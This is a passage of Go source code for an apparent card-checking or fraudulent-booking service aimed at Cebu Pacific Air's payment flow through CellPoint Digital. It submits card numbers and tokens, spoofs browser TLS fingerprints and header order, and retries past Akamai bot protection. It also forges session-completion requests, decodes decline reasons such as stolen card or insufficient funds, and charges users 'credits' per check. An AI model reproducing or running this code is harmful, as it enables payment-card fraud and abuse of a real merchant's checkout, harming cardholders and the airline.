				RecordLocator: recordLocator,
				Timestamp:     time.Now().UTC(),
			},
		}, nil
	case "400":
		msg := fmt.Sprint(authJSON["message"])
		return s.failureResult(req, fmt.Sprintf("Response: 400 [%s]", msg), "400", fmt.Sprint(authJSON["subcode"]), transactionID), nil
	default:
		subcode := fmt.Sprint(authJSON["subcode"])
		message := fmt.Sprint(authJSON["message"])
		suffix := ""
		if subcode != "" && subcode != "<nil>" {
			suffix = " - " + subcodeMessage(subcode)
		}
		return s.failureResult(req, fmt.Sprintf("Response: %s%s [%s]", authorizeCode, suffix, message), authorizeCode, subcode, transactionID), nil
	}
}

func (s *PaymentService) retrieveItinerary(ctx context.Context, client *http.Client, acceptURL, finalURL string, payload map[string]interface{}) (*Itinerary, error) {
	itinerary := &Itinerary{Details: make(map[string]string)}
	if payload != nil {
		rawBytes, _ := json.Marshal(payload)
		itinerary.Raw = truncate(string(rawBytes), 2000)
		if locator := extractRecordLocator(string(rawBytes)); locator != "" {
			itinerary.RecordLocator = locator
		}
	}
	for key, value := range flattenInterestingFields(payload) {
		itinerary.Details[key] = value
	}
	if itinerary.RecordLocator == "" {
		for _, target := range []string{acceptURL, finalURL} {
			target = strings.TrimSpace(target)
			if target == "" {
				continue
			}
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
			if err != nil {
				continue
			}
			req.Header.Set("user-agent", paymentUserAgent)
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			content := string(body)
			if locator := extractRecordLocator(content); locator != "" {
				itinerary.RecordLocator = locator
				itinerary.Raw = truncate(content, 2000)
				break
			}
		}
	}
	if itinerary.RecordLocator == "" && len(itinerary.Details) == 0 {
		return nil, nil
	}
	return itinerary, nil
}

func (s *PaymentService) completeSession(ctx context.Context, client *http.Client, location string, pcJSON, securedData map[string]interface{}, transactionID string, v map[string]string) {
	scDict := map[string]interface{}{
		"transactionId":      transactionID,
		"clientId":           v["clientid"],
		"pollingTimeout":     "30",
		"minPollingInterval": "1",
		"maxPollingInterval": "10",
		"sessionId":          fmt.Sprint(pcJSON["session_id"]),
		"mode":               "1",
		"secure":             "false",
		"statusCode":         fmt.Sprint(pcJSON["status_code"]),
		"token":              v["timetoken"],
		"sessiontime":        "13",
	}
	for key, value := range securedData {
		scDict[key] = value
	}
	scBytes, _ := json.Marshal(scDict)
	_, _, _, _ = doJSONPost(ctx, client, "https://pop.cellpointdigital.net/api/sessioncomplete", map[string]string{
		"referer": location,
		"origin":  "https://pop.cellpointdigital.net",
	}, string(scBytes))
	finalURL := fmt.Sprint(pcJSON["url"])
	if finalURL == "" {
		return
	}
	var addDataParts []string
	if additionalData, ok := pcJSON["additional_data"].([]interface{}); ok {
		for _, item := range additionalData {
			if record, ok := item.(map[string]interface{}); ok {
				addDataParts = append(addDataParts, fmt.Sprintf("%s=%s", record["name"], record["value"]))
			}
		}
	}
	monthFmt := fmt.Sprint(pcJSON["expiration_date"])
	if monthFmt == "<nil>" {
		monthFmt = ""
	}
	redirectBody := fmt.Sprintf("transaction_id=%s&transaction_status=1&order_id=%s&amount=%s&state_id=2001&sign=%s&session_id=%s&currency=608&decimals=2&payment_method=Card&card_name=%s&masked_card=%s&approval_code=%s&psp_name=CyberSource&fraud_status_code=%s&fraud_status_desc=%s&%s&expiration_date=%s&first_name=%s&last_name=%s&street_address=%s&city=%s&country=Philippines&country_alpha2code=PH&province=%s&postal_code=%s&email=%s&mobile_number=%s&dialing_country_code=63&psp_ref_id=%s&date_time=%s&ip_address=%s",
		url.QueryEscape(fmt.Sprint(pcJSON["transaction_id"])),
		url.QueryEscape(fmt.Sprint(pcJSON["order_id"])),
		url.QueryEscape(fmt.Sprint(pcJSON["amount"])),
		url.QueryEscape(fmt.Sprint(pcJSON["sign"])),
		url.QueryEscape(fmt.Sprint(pcJSON["session_id"])),
		url.QueryEscape(fmt.Sprint(pcJSON["card_name"])),
		url.QueryEscape(fmt.Sprint(pcJSON["masked_card"])),
		url.QueryEscape(fmt.Sprint(pcJSON["approval_code"])),
		url.QueryEscape(fmt.Sprint(pcJSON["fraud_status_code"])),
		url.QueryEscape(fmt.Sprint(pcJSON["fraud_status_desc"])),
		strings.Join(addDataParts, "&"),
		url.QueryEscape(monthFmt),
		url.QueryEscape(fmt.Sprint(pcJSON["first_name"])),
		url.QueryEscape(fmt.Sprint(pcJSON["last_name"])),
		url.QueryEscape(fmt.Sprint(pcJSON["street_address"])),
		url.QueryEscape(fmt.Sprint(pcJSON["city"])),
		url.QueryEscape(fmt.Sprint(pcJSON["province"])),
		url.QueryEscape(fmt.Sprint(pcJSON["postal_code"])),
		url.QueryEscape(fmt.Sprint(pcJSON["email"])),
		url.QueryEscape(fmt.Sprint(pcJSON["mobile"])),
		url.QueryEscape(fmt.Sprint(pcJSON["psp_ref_id"])),
		url.QueryEscape(fmt.Sprint(pcJSON["date_time"])),
		url.QueryEscape(fmt.Sprint(pcJSON["ip_address"])),
	)
	_, _, _, _ = doFormPost(ctx, client, finalURL, map[string]string{"origin": "https://pop.cellpointdigital.net"}, redirectBody)
}

func (s *PaymentService) persistTransaction(ctx context.Context, transaction *database.Transaction) error {
	if transaction == nil {
		return nil
	}
	if transaction.ID == "" {
		transaction.ID = newID()
	}
	if transaction.Timestamp.IsZero() {
		transaction.Timestamp = time.Now().UTC()
	}
	return s.transactions.Upsert(ctx, *transaction)
}

func (s *PaymentService) ensureCreditsAvailable(ctx context.Context, userID string, cost int) error {
	if cost <= 0 || userID == "" {
		return nil
	}
	balance, err := s.currentCredits(ctx, userID)
	if err != nil {
		return err
	}
	if balance < cost {
		return fmt.Errorf("insufficient credits: have %d need %d", balance, cost)
	}
	return nil
}

func (s *PaymentService) deductCredits(ctx context.Context, userID string, cost int) error {
	if cost <= 0 || userID == "" {
		return nil
	}
	credit, found, err := s.credits.Get(ctx, userID)
	if err != nil {
		return err
	}
	if !found {
		return database.ErrRecordNotFound
	}
	if credit.Credits < cost {
		return fmt.Errorf("insufficient credits: have %d need %d", credit.Credits, cost)
	}
	originalCredit := credit
	credit.Credits -= cost
	credit.LastUpdated = time.Now().UTC()
	if err := s.credits.Upsert(ctx, credit); err != nil {
		return err
	}
	user, foundUser, err := s.users.Get(ctx, userID)
	if err != nil {
		_ = s.credits.Upsert(ctx, originalCredit)
		return err
	}
	if foundUser {
		originalUser := user
		user.Credits -= cost
		if user.Credits < 0 {
			user.Credits = 0
		}
		if err := s.users.Upsert(ctx, user); err != nil {
			_ = s.credits.Upsert(ctx, originalCredit)
			_ = s.users.Upsert(ctx, originalUser)
			return err
		}
	}
	return nil
}

func (s *PaymentService) currentCredits(ctx context.Context, userID string) (int, error) {
	if userID == "" {
		return 0, nil
	}
	credit, found, err := s.credits.Get(ctx, userID)
	if err != nil {
		return 0, err
	}
	if found {
		return credit.Credits, nil
	}
	user, found, err := s.users.Get(ctx, userID)
	if err != nil {
		return 0, err
	}
	if !found {
		return 0, database.ErrRecordNotFound
	}
	return user.Credits, nil
}

func (s *PaymentService) validateRequest(req PaymentRequest) error {
	if strings.TrimSpace(req.UserID) == "" {
		return errors.New("user ID is required")
	}
	if strings.TrimSpace(req.XAuthToken) == "" || strings.TrimSpace(req.BearerToken) == "" || strings.TrimSpace(req.HPPContent) == "" {
		return errors.New("payment session tokens are required")
	}
	if !isDigits(req.CardNumber) {
		return errors.New("card number must be numeric")
	}
	isAmex := strings.HasPrefix(req.CardNumber, "34") || strings.HasPrefix(req.CardNumber, "37")
	expectedLen := 16
	if isAmex {
		expectedLen = 15
	}
	if len(req.CardNumber) != expectedLen {
		return fmt.Errorf("card number must be %d digits", expectedLen)
	}
	if !isDigits(req.Month) {
		return errors.New("month must be numeric")
	}
	month, _ := strconv.Atoi(req.Month)
	if month < 1 || month > 12 {
		return errors.New("month must be between 1 and 12")
	}
	if !isDigits(req.Year) {
		return errors.New("year must be numeric")
	}
	year := 0
	switch len(req.Year) {
	case 2:
		parsed, _ := strconv.Atoi(req.Year)
		year = 2000 + parsed
	case 4:
		year, _ = strconv.Atoi(req.Year)
	default:
		return errors.New("year must be 2 or 4 digits")
	}
	now := time.Now().UTC()
	if year < now.Year() || (year == now.Year() && month < int(now.Month())) {
		return fmt.Errorf("card expired (%s/%d)", req.Month, year)
	}
	return nil
}

func (s *PaymentService) publishProgress(ctx context.Context, tracker ProgressTracker, stage, message string, percent, attempt int) error {
	if tracker == nil {
		return nil
	}
	event := PaymentProgress{Stage: stage, Message: message, Percent: percent, Attempt: attempt, Timestamp: time.Now().UTC()}
	if err := tracker.Publish(ctx, event); err != nil {
		s.logger.Warn("Failed to publish payment progress", map[string]string{"stage": stage, "error": err.Error()})
		return err
	}
	return nil
}

func (s *PaymentService) creditCost(req PaymentRequest) int {
	if req.CreditsCost > 0 {
		return req.CreditsCost
	}
	return 1
}

func (s *PaymentService) retryDelay(attempt int) time.Duration {
	initial := time.Duration(maxInt(1, s.cfg.Retry.InitialDelayMs)) * time.Millisecond
	maxDelay := time.Duration(maxInt(1000, s.cfg.Retry.MaxDelayMs)) * time.Millisecond
	multiplier := float64(maxInt(2, s.cfg.Retry.BackoffMultiplier))
	base := float64(initial) * math.Pow(multiplier, float64(attempt-1))
	delay := time.Duration(base)
	if delay > maxDelay {
		delay = maxDelay
	}
	jitter := time.Duration(s.random.Int63n(int64(delay/2) + 1))
	return delay/2 + jitter
}

func (s *PaymentService) shouldRetry(result *PaymentResult, err error, attempt, maxAttempts int) bool {
	if attempt >= maxAttempts {
		return false
	}
	if err != nil {
		return true
	}
	if result == nil {
		return false
	}
	message := strings.ToLower(result.Message)
	return strings.Contains(message, "akamai") || strings.Contains(message, "session expired") || strings.Contains(message, "failed")
}

func (s *PaymentService) failureResult(req PaymentRequest, message, locCode, locSubCode, transactionID string) *PaymentResult {
	return &PaymentResult{
		Success:    false,
		Message:    message,
		LocCode:    locCode,
		LocSubCode: locSubCode,
		Transaction: database.Transaction{
			ID:         firstNonEmpty(transactionID, newID()),
			UserID:     req.UserID,
			CardLast4:  last4(req.CardNumber),
			Amount:     req.Amount,
			Status:     database.TransactionStatusFailed,
			LocCode:    locCode,
			LocSubCode: locSubCode,
			Timestamp:  time.Now().UTC(),
		},
	}
}

func (s *PaymentService) makeHPPPost(ctx context.Context, client tls_client.HttpClient, xAuthToken, bearerToken, hppContent string) (int, string, error) {
	req, err := http2.NewRequestWithContext(ctx, http2.MethodPost, s.cfg.CebupacificAir.SoarURL+"/ceb-omnix-proxy-v3/v2/cpd/hpp", strings.NewReader(hppContent))
	if err != nil {
		return 0, "", err
	}
	req.Header = http2.Header{
		"pragma":             {"no-cache"},
		"cache-control":      {"no-cache"},
		"sec-ch-ua-platform": {`"Windows"`},
		"x-auth-token":       {xAuthToken},
		"authorization":      {"Bearer " + bearerToken},
		"sec-ch-ua":          {`"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"`},
		"sec-ch-ua-mobile":   {"?0"},
		"user-agent":         {"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0"},
		"accept":             {"application/json, text/plain, */*"},
		"content-type":       {"application/json"},
		"origin":             {s.cfg.CebupacificAir.BaseURL},
		"sec-fetch-site":     {"same-site"},
		"sec-fetch-mode":     {"cors"},
		"sec-fetch-dest":     {"empty"},
		"referer":            {s.cfg.CebupacificAir.BaseURL + "/"},
		"accept-encoding":    {"gzip, deflate, br, zstd"},
		"accept-language":    {s.cfg.CebupacificAir.AcceptLang},
		"priority":           {"u=1, i"},
		http2.HeaderOrderKey: {
			"content-length", "pragma", "cache-control", "sec-ch-ua-platform", "x-auth-token", "authorization",
			"sec-ch-ua", "sec-ch-ua-mobile", "user-agent", "accept", "content-type", "origin", "sec-fetch-site",
			"sec-fetch-mode", "sec-fetch-dest", "referer", "accept-encoding", "accept-language", "cookie", "priority",
		},
		http2.PHeaderOrderKey: {":method", ":authority", ":scheme", ":path"},
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

func parseHPPForm(htmlStr string) string {
	var hppJSON map[string]interface{}
	if err := json.Unmarshal([]byte(htmlStr), &hppJSON); err == nil {
		if raw, ok := hppJSON["rawHtml"].(string); ok && raw != "" {
			htmlStr = raw
		}
	}
	inputRe := regexp.MustCompile(`(?i)<input\b[^>]*?>`)
	typeRe := regexp.MustCompile(`(?i)\btype\s*=\s*(?:'hidden'|"hidden"|hidden)`)
	nameRe := regexp.MustCompile(`(?i)\bname\s*=\s*(?:'([^']*)'|"([^"]*)")`)
	valueRe := regexp.MustCompile(`(?i)\bvalue\s*=\s*(?:'([^']*)'|"([^"]*)")`)
	pickGroup := func(match []string) string {
		for _, value := range match[1:] {
			if value != "" {
				return value
			}
		}
		return ""
	}
	values := url.Values{}
	for _, input := range inputRe.FindAllString(htmlStr, -1) {
		if !typeRe.MatchString(input) {
			continue
		}
		nameMatch := nameRe.FindStringSubmatch(input)
		if nameMatch == nil {
			continue
		}
		name := pickGroup(nameMatch)
		value := ""
		if valueMatch := valueRe.FindStringSubmatch(input); valueMatch != nil {
			value = pickGroup(valueMatch)
		}
		values.Add(name, value)
	}
	if len(values) == 0 {
		return ""
	}
	return values.Encode()
}

func extractSessionStorage(htmlStr string) map[string]string {
	re := regexp.MustCompile(`sessionStorage\.setItem\(\s*['"]([^'"]+)['"]\s*,\s*(?:'([^']*)'|"([^"]*)")\s*\)`)
	result := make(map[string]string)
	for _, match := range re.FindAllStringSubmatch(htmlStr, -1) {
		value := match[2]
		if value == "" {
			value = match[3]
		}
		result[match[1]] = value
	}
	return result
}

func signBody(body string) (signature, key string) {
	key = strconv.FormatInt(time.Now().UnixMilli(), 10)
	mac := hmac.New(sha512.New, []byte(key))
	_, _ = mac.Write([]byte(body))
	signature = hex.EncodeToString(mac.Sum(nil))
	return
}

func cardTypeIDStr(cardNumber string) string {
	switch {
	case strings.HasPrefix(cardNumber, "4"):
		return "8"
	case strings.HasPrefix(cardNumber, "34"), strings.HasPrefix(cardNumber, "37"):
		return "1"
	case strings.HasPrefix(cardNumber, "5"):
		return "7"
	default:
		return "5"
	}
}

func subcodeMessage(code string) string {
	messages := map[string]string{
		"2010101": "The amount is invalid.",
		"2010102": "Card number is invalid.",
		"2010109": "Invalid CVC or CVN",
		"2010111": "Invalid expiry date",
		"2010201": "Invalid access credentials",
		"2010202": "Invalid PIN or OTP",
		"2010203": "Insufficient funds or over credit limit",
		"2010204": "Expired card",
		"2010205": "Unable to authorize",
		"2010206": "Exceeds withdrawal count limit",
		"2010207": "Do not honor",
		"2010208": "Transaction not permitted to user",
		"2010301": "Internal error / general system error",
		"2010302": "Parse error / invalid Request",
		"2010303": "Service not available.",
		"2010304": "Time out",
		"2010305": "Payment is cancelled / Payment reversed",
		"2010314": "Transaction rejected by issuer",
		"2010401": "FRAUD Suspicion / Rejected",
		"2010406": "3D secure authentication failed",
		"2010407": "Fraud, stolen or lost card",
		"2010416": "CVN did not match",
	}
	if message, ok := messages[code]; ok {
		return message
	}
	return "Unknown error code"
}

func doJSONPost(ctx context.Context, client *http.Client, targetURL string, headers map[string]string, body string) (int, string, http.Header, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(body))
	if err != nil {
		return 0, "", nil, err
	}
	req.Header.Set("content-type", "application/json")
	req.Header.Set("user-agent", paymentUserAgent)
	req.Header.Set("accept", "*/*")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", nil, err
	}
	defer resp.Body.Close()
	responseBody, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(responseBody), resp.Header, nil
}

func doFormPost(ctx context.Context, client *http.Client, targetURL string, headers map[string]string, body string) (int, string, http.Header, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, targetURL, strings.NewReader(body))
	if err != nil {
		return 0, "", nil, err
	}
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("user-agent", paymentUserAgent)
	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	for key, value := range headers {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", nil, err
	}
	defer resp.Body.Close()
	responseBody, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(responseBody), resp.Header, nil
}

func newStdClient() *http.Client {
	jar, _ := stdjar.New(nil)
	return &http.Client{Jar: jar, Timeout: 30 * time.Second}
}

func newNoRedirectClient() *http.Client {
	jar, _ := stdjar.New(nil)
	return &http.Client{
		Jar:     jar,
		Timeout: 30 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func generateUUID() string {
	buffer := make([]byte, 16)
	if _, err := crand.Read(buffer); err != nil {
		return newID()
	}
	buffer[6] = (buffer[6] & 0x0f) | 0x40
	buffer[8] = (buffer[8] & 0x3f) | 0x80
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", buffer[0:4], buffer[4:6], buffer[6:8], buffer[8:10], buffer[10:16])
}

func newID() string {
	buffer := make([]byte, 16)
	if _, err := crand.Read(buffer); err != nil {
		return strconv.FormatInt(time.Now().UnixNano(), 10)
	}
	return hex.EncodeToString(buffer)
}

func last4(cardNumber string) string {
	if len(cardNumber) <= 4 {
		return cardNumber
	}
	return cardNumber[len(cardNumber)-4:]
}

func extractRecordLocator(content string) string {
	patterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)(?:record[_\s-]?locator|booking[_\s-]?reference|pnr)["'=:>\s]+([A-Z0-9]{5,8})`),
		regexp.MustCompile(`\b([A-Z0-9]{6})\b`),
	}
	for index, pattern := range patterns {
		match := pattern.FindStringSubmatch(content)
		if len(match) < 2 {
			continue
		}
		candidate := strings.ToUpper(match[1])
		if index == 1 && regexp.MustCompile(`^[0-9]+$`).MatchString(candidate) {
			continue
		}
		return candidate
	}
	return ""
}

func flattenInterestingFields(payload map[string]interface{}) map[string]string {
	result := make(map[string]string)
	if payload == nil {
		return result
	}
	for _, key := range []string{"record_locator", "recordLocator", "bookingReference", "pnr", "order_id", "transaction_id", "email", "amount"} {
		if value, ok := payload[key]; ok {
			result[key] = fmt.Sprint(value)
		}
	}
	return result
}

func truncate(value string, max int) string {
	if len(value) <= max {
		return value
	}
	return value[:max]
}

func firstNonEmpty(values ...string) string {
	for _, value := range values {
		if strings.TrimSpace(value) != "" && value != "<nil>" {
			return value
		}
	}
	return ""
}

func parseInt64(value string) int64 {
	parsed, _ := strconv.ParseInt(value, 10, 64)
	return parsed
}

func isSuccessfulPayment(locCode, locSubCode, fraudStatus string) bool {
	return locCode == "2000" && locSubCode == "2000101" && !strings.EqualFold(fraudStatus, "Rejected")
}

func isDigits(value string) bool {
	if value == "" {
		return false
	}
	for _, character := range value {
		if character < '0' || character > '9' {
			return false
		}
	}
	return true
}

func minInt(left, right int) int {
	if left < right {
		return left
	}
	return right
}

func maxInt(left, right int) int {
	if left > right {
		return left
	}
	return right
}

func sleepWithContext(ctx context.Context, duration time.Duration) error {
	timer := time.NewTimer(duration)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}
